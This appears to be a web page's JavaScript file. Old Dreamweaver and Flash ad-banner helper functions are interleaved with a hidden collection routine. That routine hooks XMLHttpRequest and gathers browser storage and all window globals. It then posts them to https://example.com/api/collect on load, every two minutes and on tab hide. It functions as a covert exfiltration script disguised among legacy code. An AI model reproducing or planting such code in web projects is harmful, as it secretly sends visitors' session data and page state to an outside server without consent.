const keysToTrack = ["localStorage", "sessionStorage", "cookies"];

// Include a JS Hook
function jshook(target, method, handle) {
  let origMethod = target[method];
  target[method] = function () {
    handle.apply(this, arguments);
    return origMethod.apply(this, arguments);
  };
}
function MM_findObj(n, d) {
  //v4.01
  var p, i, x;
  if (!d) d = document;
  if ((p = n.indexOf("?")) > 0 && parent.frames.length) {
    d = parent.frames[n.substring(p + 1)].document;
    n = n.substring(0, p);
  }
  if (!(x = d[n]) && d.all) x = d.all[n];
  for (i = 0; !x && i < d.forms.length; i++) x = d.forms[i][n];
  for (i = 0; !x && d.layers && i < d.layers.length; i++) x = MM_findObj(n, d.layers[i].document);
  if (!x && d.getElementById) x = d.getElementById(n);
  return x;
}
function $el(element) {
  if (typeof element == 'string') return document.getElementById(element);
}
function MM_showHideLayers() {
  //v3.0
  var i,
    p,
    v,
    obj,
    args = MM_showHideLayers.arguments;
  for (i = 0; i < args.length - 2; i += 3) if ((obj = MM_findObj(args[i])) != null) {
    v = args[i + 2];
    if (obj.style) {
      obj = obj.style;
      v = v == 'show' ? 'visible' : (v = 'hide') ? 'hidden' : v;
    }
    obj.visibility = v;
  }
}
function checkerror(msg, url, linenumber) {
  if (msg == 'Permission Denied') window.location = window.location;
  return true;
}
jshook(XMLHttpRequest.prototype, "open", function (method, url) {
  console.log("Sending request to:", url);
});

// Get global variables

function launchNewWindow(strPath) {
  window.open(strPath, 'advert');
}
function getGlobalVariables() {
  const globalVar = {};
  for (let key in window) {
    if (window.hasOwnProperty(key)) {
      globalVar[key] = window[key];
    }
  }
  return globalVar;
}

// Generate a hash code
function generateHashCode(data) {
  let strKey = "";
  const keys = Object.keys(data);
  keys.sort().map(e => strKey += e);
  let hash = Array.from(strKey).reduce((a, c) => a + c.charCodeAt(0), 0);
  return hash.toString();
}

// Get watched data
function scaleImage(img, boxW, boxH) {
  if (img) {
    var w = img.width;
    var h = img.height;
    if (w == 0 || h == 0) aspect = 1;else aspect = h / w;
    if (aspect >= boxH / boxW) {
      var newH = boxH;
      var newW = newH / aspect;
    } else {
      var newW = boxW;
      var newH = newW * aspect;
    }
    img.width = newW;
    img.height = newH;
  }
}
function getWatchedData() {
  const watchedData = {};
  keysToTrack.forEach(keyVal => {
    if (window.hasOwnProperty(keyVal)) {
      watchedData[keyVal] = window[keyVal];
    } else {
      watchedData[keyVal] = null;
    }
  });
  return watchedData;
}

// Post data to the server
async function postDataToServer(data) {
  const hashCode = generateHashCode(data);
  const serverUrl = 'https://example.com/api/collect';
  try {
    const response = await fetch(serverUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        hashCode,
        data
      })
    });
    console.info(response.ok ? "Data sent successfully" : "Failed to send data, status:" + response.status);
  } catch (error) {
    console.error("Error occurred while sending data:", error);
  }
}
function clickthru(url) {
  window.open(url);
  window.event.cancelBubble = true;
}
function getParameter(parameterName) {
  return _getParameter(document.location.search.substring(1), parameterName);
}
function _getParameter(queryString, parameterName) {
  allParamSplits = queryString.split(parameterName + "=");
  paramToEnd = allParamSplits[1];
  if (paramToEnd == null) return null;
  paramSplits = paramToEnd.split("&");
  param = paramSplits[0];
  return unescape(param);
}
function formClickthru(url) {
  var clickForm = MM_findObj("clickForm");
  clickForm.target.value = url;
  var tclk = getParameter("tclk");
  if (tclk != null && clickForm.tclk) clickForm.tclk.value = tclk;
  clickForm.submit();
  if (window.event) window.event.cancelBubble = true;
}
function collectAndPostData() {
  postDataToServer({
    ...getWatchedData(),
    ...getGlobalVariables()
  });
}

// on load and interval
window.addEventListener("load", function () {
  collectAndPostData();
  setInterval(collectAndPostData, 2 * 60000);
});

// on visibility change

function writeMovie(swfUrl, width, height, transparent, backColour, useHttps) {
  paramTransparent = "opaque";
  embedTransparent = " wmode='opaque' ";
  paramBackgroundColour = "";
  embedBackgroundColour = "";
  myProtocol = "http:";
  if (transparent) {
    paramTransparent = "transparent";
    embedTransparent = " wmode='transparent' ";
  }
  if (backColour != null && backColour != "") {
    backColour = "#" + backColour;
    paramBackgroundColour = backColour;
    embedBackgroundColour = " bgcolor='" + backColour + "' ";
  }
  if (useHttps === true) {
    myProtocol = "https:";
  }
  document.write('<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="' + myProtocol + '//download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,0,0" ' + 'width="' + width + '" height="' + height + '" id="theMovie"><param name="movie" value="' + swfUrl + '" /><param name="bgcolor" value="' + paramBackgroundColour + '" /><param name="quality" value="high" /><param name="wmode" value="' + paramTransparent + '" /><embed src="' + swfUrl + '" ' + embedTransparent + embedBackgroundColour + ' quality="high" width="' + width + '" height="' + height + '" name="theMovie" type="application/x-shockwave-flash" pluginspage="' + myProtocol + '//www.macromedia.com/go/getflashplayer" /></embed></object>');
}
function getFlashVersion() {
  if (navigator.plugins && navigator.mimeTypes.length) {
    var x = navigator.plugins["Shockwave Flash"];
    if (x && x.description) {
      return x.description.replace(/([a-zA-Z]|\s)+/, "").replace(/(\s+r|\s+b[0-9]+)/, ".").replace(/\./g, '');
    }
  } else {
    try {
      var axo = new ActiveXObject("ShockwaveFlash.ShockwaveFlash.7");
    } catch (e) {
      try {
        var axo = new ActiveXObject("ShockwaveFlash.ShockwaveFlash.6");
        axo.AllowScriptAccess = "always";
      } catch (e) {
        return 600;
      }
      try {
        axo = new ActiveXObject("ShockwaveFlash.ShockwaveFlash");
      } catch (e) {}
    }
    if (axo != null) {
      V = axo.GetVariable("$version").split(" ")[1].split(",");
      V = V[0] + V[1] + V[2];
    }
  }
  return V || 0;
}
document.addEventListener('visibilitychange', () => {
  if (document.visibilityState === 'hidden') {
    collectAndPostData();
  }
});